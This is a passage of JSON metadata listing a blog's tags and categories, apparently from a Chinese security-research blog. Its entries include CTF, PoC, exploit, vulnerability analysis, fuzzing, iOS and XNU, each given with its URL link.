lug":"Chrome","link":"/tags/Chrome/"},{"name":"逆向","slug":"逆向","link":"/tags/%E9%80%86%E5%90%91/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"POC","slug":"POC","link":"/categories/POC/"},{"name":"学习记录","slug":"学习记录","link":"/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"工具","slug":"工具","link":"/categories/%E5%B7%A5%E5%85%B7/"},{"name":"PoC","slug":"PoC","link":"/categories/PoC/"},{"name":"配置环境踩坑","slug":"配置环境踩坑","link":"/categories/%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91/"},{"name":"编程","slug":"编程","link":"/categories/%E7%BC%96%E7%A8%8B/"},{"name":"环境配置踩坑","slug":"环境配置踩坑","link":"/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"},{"name":"其他","slug":"其他","link":"/categories/%E5%85%B6%E4%BB%96/"},{"name":"exploit","slug":"exploit","link":"/categories/exploit/"},{"name":"Fuzz","slug":"Fuzz","link":"/categories/Fuzz/"},{"name":"环境配置","slug":"环境配置","link":"/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"论文阅读","slug":"论文阅读","link":"/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"笔记","slug":"笔记","link":"/categories/%E7%AC%94%E8%AE%B0/"},{"name":"iOS","slug":"iOS","link":"/categories/iOS/"},{"name":"XNU","slug":"XNU","link":"/categories/XNU/"}]}